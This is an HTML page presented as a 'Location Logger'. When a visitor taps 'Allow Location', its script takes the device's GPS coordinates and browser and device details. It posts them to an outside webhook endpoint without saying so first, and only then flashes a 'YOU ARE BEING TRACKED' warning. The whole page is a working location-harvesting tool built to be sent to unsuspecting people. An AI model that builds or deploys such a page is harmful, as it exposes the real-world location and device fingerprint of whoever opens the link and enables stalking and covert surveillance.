<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Location Logger + Warning</title>

  <!-- Google Fonts (Nosifer) -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Nosifer&display=swap" rel="stylesheet">

  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      width: 100%;
      font-family: Arial, sans-serif;
      background-color: #111;
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
    }

    /* The warning overlay */
    #warning {
      position: fixed;
      top: 0;
      left: 0;
      height: 100vh;
      width: 100vw;
      background-color: darkred;
      display: none; /* hidden at start */
      justify-content: center;
      align-items: center;
      color: white;
      font-family: 'Nosifer', cursive;
      text-align: center;
      z-index: 9999;
      font-size: 10vw;
      line-height: 1.2;
      animation: flicker 1.5s infinite;
    }

    @keyframes flicker {
      0%, 19%, 21%, 23%, 25%, 54%, 56%, 100% { opacity: 1; }
      20%, 22%, 24%, 55% { opacity: 0.2; }
    }

    /* Responsive font sizes */
    @media (max-width: 768px) { #warning { font-size: 15vw; } }
    @media (max-width: 480px) { #warning { font-size: 20vw; } }

    /* Button styling */
    #getLocationBtn {
      padding: 15px 30px;
      font-size: 1.2em;
      cursor: pointer;
      background: crimson;
      color: white;
      border: none;
      border-radius: 8px;
    }
  </style>
</head>
<body>
  <div id="warning">YOU ARE BEING TRACKED</div>

  <h1>Location Logger</h1>
  <p>Tap below to allow your location</p>
  <button id="getLocationBtn">Allow Location</button>

  <script>
    function getDeviceInfo() {
      const ua = navigator.userAgent;
      const platform = navigator.platform;
      let deviceType = "Unknown";
      if (/Mobi|Android/i.test(ua)) deviceType = "Mobile";
      else if (/iPad|Tablet/i.test(ua)) deviceType = "Tablet";
      else deviceType = "Desktop";

      return {
        userAgent: ua,
        platform: platform,
        deviceType: deviceType,
        browser: (() => {
          if (ua.indexOf("Chrome") > -1) return "Chrome";
          if (ua.indexOf("Firefox") > -1) return "Firefox";
          if (ua.indexOf("Safari") > -1 && ua.indexOf("Chrome") === -1) return "Safari";
          if (ua.indexOf("Edge") > -1) return "Edge";
          return "Other";
        })()
      };
    }

    document.getElementById("getLocationBtn").addEventListener("click", () => {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          (pos) => {
            const deviceInfo = getDeviceInfo();
            // send coordinates + device info
            fetch("https://eo6f81z4derf3yg.m.pipedream.net", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                timestamp: new Date().toISOString(),
                lat: pos.coords.latitude,
                lon: pos.coords.longitude,
                device: deviceInfo
              })
            });

            // show the full-screen warning
            const warning = document.getElementById('warning');
            warning.style.display = 'flex';
          },
          (err) => console.error("Geo error:", err)
        );
      } else {
        console.log("Geolocation not supported");
      }
    });
  </script>
</body>
</html>
